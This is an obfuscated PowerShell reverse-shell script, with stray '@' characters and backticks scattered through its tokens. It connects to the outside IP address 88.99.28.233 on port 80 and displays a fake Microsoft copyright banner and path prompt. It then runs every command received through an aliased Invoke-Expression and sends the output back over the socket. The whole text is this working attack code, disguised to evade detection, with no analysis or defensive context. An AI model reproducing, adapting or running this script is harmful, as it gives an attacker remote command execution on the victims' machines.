s@e@t-a@lia@s@ -Na@me@ K -Va@lue@ Out-s@tring
s@e@t-a@lia@s@ -Na@me@ nothingHe@re@ -Va@lue@ ie@x
$BT = Ne@w-Obje@ct "s@`y`s@te@m.Ne@t.s@ocke@ts@.T`CPCl`ie@nt"('88.99.28.233', 80);
$re@pla@ce@ = $BT.Ge@ts@tre@a@m();
[byte@[]]$B = 0..(32768*2-1)|%{0};
$B = ([te@xt.e@ncoding]::UTF8).Ge@tByte@s@("(c) Micros@oft Corpora@tion. a@ll rights@ re@s@e@rve@d.`n`n")
$re@pla@ce@.Write@($B,0,$B.Le@ngth)
$B = ([te@xt.e@ncoding]::a@s@CII).Ge@tByte@s@((Ge@t-Loca@tion).Pa@th + '>')
$re@pla@ce@.Write@($B,0,$B.Le@ngth)
[byte@[]]$int = 0..(10000+55535)|%{0};
while@(($i = $re@pla@ce@.Re@a@d($int, 0, $int.Le@ngth)) -ne@ 0){;
$ROM = [te@xt.e@ncoding]::a@s@CII.Ge@ts@tring($int,0, $i);
$I = (nothingHe@re@ $ROM 2>&1 | K );
$I2  = $I + (pwd).Pa@th + '> ';
$U = [te@xt.e@ncoding]::a@s@CII.Ge@tByte@s@($I2);
$re@pla@ce@.Write@($U,0,$U.Le@ngth);
$re@pla@ce@.Flus@h()};
$BT.Clos@e@()
